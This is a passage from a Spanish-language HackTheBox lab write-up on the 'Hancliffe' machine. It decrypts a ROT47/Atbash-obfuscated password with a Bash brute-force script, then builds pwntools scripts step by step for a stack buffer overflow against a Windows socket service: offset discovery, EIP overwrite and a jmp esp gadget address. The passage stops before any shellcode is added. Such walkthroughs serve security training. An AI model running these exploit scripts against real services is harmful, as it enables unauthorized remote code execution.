+    <span class=mtk5>if</span> <span class=mtk1>((</span><span class=mtk5>0x</span><span class=mtk6>41</span> <span class=mtk5>&lt;=</span> <span class=mtk1>c</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>c</span> <span class=mtk5>&lt;=</span> <span class=mtk5>0x</span><span class=mtk6>5a</span><span class=mtk1>)</span> <span class=mtk5>||</span> <span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>61</span> <span class=mtk5>&lt;=</span> <span class=mtk1>c</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>c</span> <span class=mtk5>&lt;=</span> <span class=mtk5>0x</span><span class=mtk6>7a</span><span class=mtk1>))</span> <span class=mtk1>{</span>  
+      <span class=mtk1>b</span> <span class=mtk5>=</span> <span class=mtk1>(c</span> <span class=mtk5>&lt;=</span> <span class=mtk5>0x</span><span class=mtk6>5a</span><span class=mtk1>);</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(b)</span> <span class=mtk1>{</span>
+        <span class=mtk1>c</span> <span class=mtk5>+=</span> <span class=mtk4>'</span> <span class=mtk4>'</span><span class=mtk1>;</span>
+      <span class=mtk1>}</span>
+
+      <span class=mtk1>s[i]</span> <span class=mtk5>=</span> <span class=mtk5>0x</span><span class=mtk6>7a</span> <span class=mtk5>-</span> <span class=mtk1>(c</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>9f</span><span class=mtk1>);</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(b)</span> <span class=mtk1>{</span>
+        <span class=mtk1>s[i]</span> <span class=mtk5>-=</span> <span class=mtk5>0x</span><span class=mtk6>20</span><span class=mtk1>;</span>
+      <span class=mtk1>}</span>
+    <span class=mtk1>}</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk8>puts</span><span class=mtk1>(s);</span>
+
+  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>Ahora podemos compilarlas y analizar su comportamiento al cifrar todos los caracteres ASCII imprimibles (excepto espacios, saltos de línea y retornos de carro):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gcc</span> -o encrypt1 encrypt1.c
+
+<span class=code-cyan>$</span> <span class=code-dark-green>gcc</span> -o encrypt2 encrypt2.c
+
+<span class=code-cyan>$</span> chars=<span class=code-dark-yellow>"</span><span class=code-dark-magenta>$(</span><span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'import string; print(string.printable.strip())'</span><span class=code-dark-magenta>)</span><span class=code-dark-yellow>"</span>
+
+<span class=code-cyan>$</span> <span class=code-dark-green>echo</span> $chars; <span class=code-dark-green>./encrypt1</span> <span class=code-dark-yellow>"<span class=code-dark-cyan>$chars</span>"</span>
+0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~  
+_`abcdefgh23456789:;<=>?@ABCDEFGHIJKpqrstuvwxyz{|}~!"#$%&'()*+PQRSTUVWXYZ[\]^ijklmno,-./01LMNO
+
+<span class=code-cyan>$</span> <span class=code-dark-green>echo</span> $chars; <span class=code-dark-green>./encrypt2</span> <span class=code-dark-yellow>"<span class=code-dark-cyan>$chars</span>"</span>
+0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+0123456789zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+</code></pre></div><p>La primera función realiza una sustitución un tanto rara, mientras que la segunda solamente invierte el orden de las letras mayúsculas y minúsculas.</p><p>Aunque se puede invertir el algoritmo o crear un mapa que relacione las letras de entrada con las letras de salida para descifrar la contraseña, decidí utilizar un <em>script</em> en Bash para iterar sobre todos los caracteres imprimibles hasta encontrar las coincidencias:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>bash</span>
+
+<span class=mtk1>encrypted=</span><span class=mtk4>'YXlYeDtsbD98eDtsWms5SyU='</span>
+<span class=mtk7>echo</span> <span class=mtk4>"Encrypted :</span> <span class=mtk1>$encrypted</span><span class=mtk4>"</span>
+
+<span class=mtk1>encrypted2=</span><span class=mtk4>$(echo</span> <span class=mtk1>$encrypted</span> <span class=mtk5>|</span> <span class=mtk4>base64</span> <span class=mtk4>-d)</span>
+<span class=mtk7>echo</span> <span class=mtk4>"Encrypted2:</span> <span class=mtk1>$encrypted2</span><span class=mtk4>"</span>
+
+<span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class=mtk4>$(seq</span> <span class=mtk4>1</span> <span class=mtk1>${</span><span class=mtk5>#</span><span class=mtk1>encrypted2}</span><span class=mtk4>)</span><span class=mtk5>;</span> <span class=mtk5>do</span>
+  <span class=mtk5>for</span> <span class=mtk1>d</span> <span class=mtk5>in</span> <span class=mtk1>{32..126}</span><span class=mtk5>;</span> <span class=mtk5>do</span>
+    <span class=mtk1>c=</span><span class=mtk4>$(python3</span> <span class=mtk4>-c</span> <span class=mtk4>"print(chr(</span><span class=mtk1>$d</span><span class=mtk4>))")</span>
+
+    <span class=mtk5>if</span> <span class=mtk1>[</span> <span class=mtk4>"$(./encrypt2</span> <span class=mtk1>$c</span><span class=mtk4>)"</span> <span class=mtk5>=</span> <span class=mtk1>${encrypted2</span><span class=mtk5>:</span><span class=mtk1>i-1</span><span class=mtk5>:</span><span class=mtk1>1}</span> <span class=mtk1>]</span><span class=mtk5>;</span> <span class=mtk5>then</span>
+      <span class=mtk1>encrypted1+=$c</span>
+      <span class=mtk7>break</span>
+    <span class=mtk5>fi</span>
+  <span class=mtk5>done</span>
+<span class=mtk5>done</span>
+
+<span class=mtk7>echo</span> <span class=mtk4>"Encrypted1:</span> <span class=mtk1>$encrypted1</span><span class=mtk4>"</span>
+
+<span class=mtk5>for</span> <span class=mtk1>i</span> <span class=mtk5>in</span> <span class=mtk4>$(seq</span> <span class=mtk4>1</span> <span class=mtk1>${</span><span class=mtk5>#</span><span class=mtk1>encrypted1}</span><span class=mtk4>)</span><span class=mtk5>;</span> <span class=mtk5>do</span>
+  <span class=mtk5>for</span> <span class=mtk1>d</span> <span class=mtk5>in</span> <span class=mtk1>{32..126}</span><span class=mtk5>;</span> <span class=mtk5>do</span>
+    <span class=mtk1>c=</span><span class=mtk4>$(python3</span> <span class=mtk4>-c</span> <span class=mtk4>"print(chr(</span><span class=mtk1>$d</span><span class=mtk4>))")</span>
+
+    <span class=mtk5>if</span> <span class=mtk1>[</span> <span class=mtk4>"$(./encrypt1</span> <span class=mtk1>$c</span><span class=mtk4>)"</span> <span class=mtk5>=</span> <span class=mtk1>${encrypted1</span><span class=mtk5>:</span><span class=mtk1>i-1</span><span class=mtk5>:</span><span class=mtk1>1}</span> <span class=mtk1>]</span><span class=mtk5>;</span> <span class=mtk5>then</span>
+      <span class=mtk1>decrypted+=$c</span>
+      <span class=mtk7>break</span>
+    <span class=mtk5>fi</span>
+  <span class=mtk5>done</span>
+<span class=mtk5>done</span>
+
+<span class=mtk7>echo</span> <span class=mtk4>"Decrypted :</span> <span class=mtk1>$decrypted</span><span class=mtk4>"</span>
+
+<span class=mtk7>echo</span> <span class=mtk1>Re-compute:</span> <span class=mtk4>$(./encrypt2</span> <span class=mtk4>"$(./encrypt1</span> <span class=mtk4>"</span><span class=mtk1>$decrypted</span><span class=mtk4>")"</span> <span class=mtk5>|</span> <span class=mtk4>tr</span> <span class=mtk4>-d</span> <span class=mtk4>'\n'</span> <span class=mtk5>|</span> <span class=mtk4>base64)</span>  
+</code></pre></div><p>El procedimiento es el inverso. Primero decodificamos en Base64, luego desciframos con el segundo tipo de cifrado y después desciframos con el primer tipo de cifrado. Una vez hecho, volvemos a usar <code>encrypt1</code>, <code>encrypt2</code> y <code>base64</code> para verificar que tenemos la contraseña correcta:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> decrypt.sh
+Encrypted : YXlYeDtsbD98eDtsWms5SyU=  
+Encrypted2: ayXx;ll?|x;lZk9K%
+Encrypted1: zbCc;oo?|c;oAp9P%
+Decrypted : K3r4j@@nM4j@pAh!T
+Re-compute: YXlYeDtsbD98eDtsWms5SyU=
+</code></pre></div><p>De hecho, descubrí que los dos tipos de cifrado son algoritmos conocidos: <code>encrypt1</code> es ROT47 y <code>encrypt2</code> es el cifrado Atbash. Podemos utilizar <a href=https://gchq.github.io/CyberChef/>CyberChef</a> para descifrar la contraseña de manera más sencilla:</p><p><img src=/images/HTB/Hancliffe/Hancliffe-decryption.png alt></p><p>Perfecto, ahora nos podemos autenticar correctamente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> 10.10.11.115 9999
+Welcome Brankas Application.
+Username: alfiansyah
+Password: K3r4j@@nM4j@pAh!T
+Login Successfully!
+FullName: Vickry Alfiansyah
+Input Your Code: T3D83CbJkl1299  
+Unlocked
+
+
+Ncat: Broken pipe.
+</code></pre></div><p>Pero no conseguimos nada&mldr; A lo mejor tenemos que explotar el binario&mldr;</p><h2 id=escalada-de-privilegios-explotación-de-_buffer-overflow_>Escalada de privilegios (explotación de <em>Buffer Overflow</em>)</h2><p>Mirando de nuevo al código en C descompilado, encontramos una vulnerabilidad de <em>Buffer Overflow</em> en una función llamada <code>_Save_Creds</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>_SaveCreds</span><span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class="mtk9 mtki">param_1</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class="mtk9 mtki">param_2</span><span class=mtk1>)</span> <span class=mtk1>{</span>  
+  <span class="mtk7 mtki">char</span> <span class=mtk1>local_42[</span><span class=mtk6>50</span><span class=mtk1>];</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>local_10;</span>
+
+  <span class=mtk1>local_10</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk8>_malloc</span><span class=mtk1>(</span><span class=mtk6>100</span><span class=mtk1>);</span>
+  <span class=mtk8>_strcpy</span><span class=mtk1>(local_10,</span> <span class=mtk1>param_2);</span>
+  <span class=mtk8>_strcpy</span><span class=mtk1>(local_42,</span> <span class=mtk1>param_1);</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>Esto es vulnerable porque <code>local_42</code> tiene 50 bytes asignados como <em>buffer</em>, el programa utiliza <code>strcpy</code> (que se sabe que es vulnerable a <em>Buffer Overflow</em>) y <code>param_1</code> viene de la función que gestiona la conexión (<code>pcStack32</code>), y puede contener como máximo <code>0x50</code> = 80 bytes:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>UndefinedFunction_71901a3d</span><span class=mtk1>(</span><span class="mtk8 mtku">SOCKET</span> <span class="mtk9 mtki">param_1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+  <span class=mtk3>//</span> <span class=mtk3>...</span>
+
+  <span class=mtk5>if</span> <span class=mtk1>(iStack24</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk3>//</span> <span class=mtk3>Error</span> <span class=mtk3>handling</span>
+  <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk5>if</span> <span class=mtk1>(SStack20</span> <span class=mtk5>!=</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk3>//</span> <span class=mtk3>...</span>
+
+    <span class=mtk5>if</span> <span class=mtk1>(iStack28</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+      <span class=mtk3>//</span> <span class=mtk3>...</span>
+
+      <span class=mtk8>_memset</span><span class=mtk1>(pcStack36,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>100</span><span class=mtk1>);</span>
+      <span class=mtk8>_strncpy</span><span class=mtk1>(pcStack36,</span> <span class=mtk1>pcStack16,</span> <span class=mtk6>100</span><span class=mtk1>);</span>
+      <span class=mtk8>_memset</span><span class=mtk1>(pcStack16,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>400</span><span class=mtk1>);</span>
+      <span class=mtk8>send</span><span class=mtk1>(SStack20,</span> <span class=mtk4>"Input</span> <span class=mtk4>Your</span> <span class=mtk4>Code:</span> <span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>11</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+      <span class=mtk8>recv</span><span class=mtk1>(SStack20,</span> <span class=mtk1>pcStack16,</span> <span class=mtk5>0x</span><span class=mtk6>400</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+      <span class=mtk8>_memset</span><span class=mtk1>(pcStack32,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>50</span><span class=mtk1>);</span>
+      <span class=mtk8>_strncpy</span><span class=mtk1>(pcStack32,</span> <span class=mtk1>pcStack16,</span> <span class=mtk5>0x</span><span class=mtk6>50</span><span class=mtk1>);</span>
+      <span class=mtk8>_SaveCreds</span><span class=mtk1>(pcStack32,</span> <span class=mtk1>pcStack36);</span>
+      <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>_strncmp</span><span class=mtk1>(pcStack32,</span> <span class=mtk4>"T3D83CbJkl1299"</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>e</span><span class=mtk1>);</span>  
+
+      <span class=mtk3>//</span> <span class=mtk3>...</span>
+    <span class=mtk1>}</span>
+
+    <span class=mtk3>//</span> <span class=mtk3>...</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk5>return</span> <span class=mtk1>iStack24;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>Las vulnerabilidades de <em>Buffer Overflow</em> pueden desembocar en ejecución de código arbitrario porque podemos sobrescribir la dirección de retorno guardada en la pila (después del <em>buffer</em> reservado) y redirigir el flujo de ejecución.</p><p>En primer lugar, necesitamos saber el número de caracteres que tenemos que escribir para sobrescribir la dirección de retorno (que será almacenada en el registro <code>$eip</code> al retornar de la función <code>_Save_Creds</code>). Esto puede hacerse con un patrón (<code>cyclic</code> de <code>pwntools</code> o algunos comandos de MetaSploit Framework servirán).</p><p>Para desarrollar el <em>exploit</em> final, utilizaremos varios archivos, de manera que cada archivo contenga un paso más en el proceso de explotación. Aquí tenemos <code>exploitA.py</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk5>*</span>
+
+<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>log_level</span> <span class=mtk5>=</span> <span class=mtk4>'DEBUG'</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>])</span>
+
+    <span class=mtk1>username</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'alfiansyah'</span>
+    <span class=mtk1>password</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'K3r4j@@nM4j@pAh!T'</span>
+    <span class=mtk1>fullname</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'Vickry</span> <span class=mtk4>Alfiansyah'</span>
+    <span class=mtk1>code</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'T3D83CbJkl1299'</span>
+
+    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>code</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>cyclic</span><span class=mtk1>(</span><span class=mtk6>200</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Username:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>username</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Password:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>password</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'FullName:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>fullname</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>Your</span> <span class=mtk4>Code:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>  
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><p>Para poder desarrollar el <em>exploit</em>, necesitamos una máquina Windows con un depurador. Esta vez, estaré utilizando <a href=https://x64dbg.com>x64dbg</a> (realmente, una versión llamada <code>x32dbg</code> porque el binario es de 32 bits).</p><p>Otro tema a tener en cuenta es que el servidor de <em>sockets</em> escucha en un puerto aleatorio entre el 9000 y el 9999 (se muestra en el registro de salida del servidor). Por este motivo, añadí la dirección IP y el puerto como argumentos de línea de comandos al <em>script</em> de Python. Una vez que el programa está listo para aceptar conexiones, ejecutamos el <em>exploit</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> exploitA.py 192.168.1.47 9291
+[<span class=code-green>+</span>] Opening connection to 192.168.1.47 on port 9291: Done
+[<span class=code-red>DEBUG</span>] Received 0x1d bytes:
+    b'Welcome Brankas Application.\n'
+[<span class=code-red>DEBUG</span>] Received 0xa bytes:
+    b'Username: '
+[<span class=code-red>DEBUG</span>] Sent 0xb bytes:
+    b'alfiansyah\n'
+[<span class=code-red>DEBUG</span>] Received 0xa bytes:
+    b'Password: '
+[<span class=code-red>DEBUG</span>] Sent 0x12 bytes:
+    b'K3r4j@@nM4j@pAh!T\n'
+[<span class=code-red>DEBUG</span>] Received 0x15 bytes:
+    b'Login Successfully!\r\n'
+[<span class=code-red>DEBUG</span>] Received 0xa bytes:
+    b'FullName: '
+[<span class=code-red>DEBUG</span>] Sent 0x12 bytes:
+    b'Vickry Alfiansyah\n'
+[<span class=code-red>DEBUG</span>] Received 0x11 bytes:
+    b'Input Your Code: '
+[<span class=code-red>DEBUG</span>] Sent 0x203 bytes:
+    b'T3D83CbJkl1299aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaa\n'  
+[<span class=code-blue>*</span>] Closed connection to 192.168.1.47 port 9291
+</code></pre></div><p>El depurador se para y muestra que <code>$eip</code> tiene valor <code>0x6161616e</code>:</p><p><img src=/images/HTB/Hancliffe/Hancliffe-captureA.png alt=EIP></p><p>El valor <code>0x6161616e</code> es <code>naaa</code> en formato bytes (formato <em>little-endian</em>). Podemos calcular el <em>offset</em> necesario de esta manera:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> cyclic -l naaa  
+52
+</code></pre></div><p>Ahora, vamos a verificar que controlamos <code>$eip</code> poniendo <code>BBBB</code> (<code>0x42424242</code>). Aprovechamos también para añadir otro patrón después de <code>$eip</code> para medir el espacio disponible en la pila (<em>stack</em>) para escribir. Este es <code>exploitB.py</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk5>*</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>])</span>
+
+    <span class=mtk1>username</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'alfiansyah'</span>
+    <span class=mtk1>password</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'K3r4j@@nM4j@pAh!T'</span>
+    <span class=mtk1>fullname</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'Vickry</span> <span class=mtk4>Alfiansyah'</span>
+    <span class=mtk1>code</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'T3D83CbJkl1299'</span>
+
+    <span class=mtk1>offset</span>   <span class=mtk5>=</span> <span class=mtk6>52</span>
+
+    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>code</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk1>offset</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'BBBB'</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>cyclic</span><span class=mtk1>(</span><span class=mtk6>200</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Username:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>username</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Password:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>password</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'FullName:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>fullname</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>Your</span> <span class=mtk4>Code:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>  
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><p><img src=/images/HTB/Hancliffe/Hancliffe-captureB.png alt=EIP></p><p>En la captura de arriba, vemos que <code>$eip</code> tiene valor <code>0x42424242</code>, como esperábamos. Y también se observa que solamente tenemos 10 bytes de espacio disponible después de sobrescribir la dirección de retorno.</p><p>Esto es un problema porque los <em>shellcodes</em> de Windows ocupan más de 300 bytes. Solamente tenemos 52 bytes en la parte de basura (<code>A</code>s) y 10 bytes adicionales para añadir algunas instrucciones.</p><p>Primero de todo, tenemos que encontrar la dirección a una instrucción <code>jmp esp</code> en el binario. Esto lo podemos hacer con <code>ROPgadget</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ROPgadget</span> --binary MyFirstApp.exe | <span class=code-dark-green>grep</span> <span class=code-dark-yellow>': jmp esp'</span>  
+0x7190239f <span class=code-red>: jmp esp</span>
+</code></pre></div><p>En este punto, podemos sobrescribir la dirección de retorno con <code>0x7190239f</code>, que es una dirección del binario que ejecuta <code>jmp esp</code>. Pondremos 8 instrucciones de <em>breakpoint</em> (<code>\xcc</code>) después de este valor para que el depurador se pare al tratar de ejecutarlas. Este es <code>exploitC.py</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk5>*</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>])</span>
+
+    <span class=mtk1>username</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'alfiansyah'</span>
+    <span class=mtk1>password</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'K3r4j@@nM4j@pAh!T'</span>
+    <span class=mtk1>fullname</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'Vickry</span> <span class=mtk4>Alfiansyah'</span>
+    <span class=mtk1>code</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'T3D83CbJkl1299'</span>
+
+    <span class=mtk1>offset</span>   <span class=mtk5>=</span> <span class=mtk6>52</span>
+    <span class=mtk1>jmp_esp</span>  <span class=mtk5>=</span> <span class=mtk1>p32(</span><span class="mtk7 mtki">0x</span><span class=mtk6>7190239f</span><span class=mtk1>)</span>
+
+    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>code</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk1>offset</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>jmp_esp</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xcc</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>8</span>
+
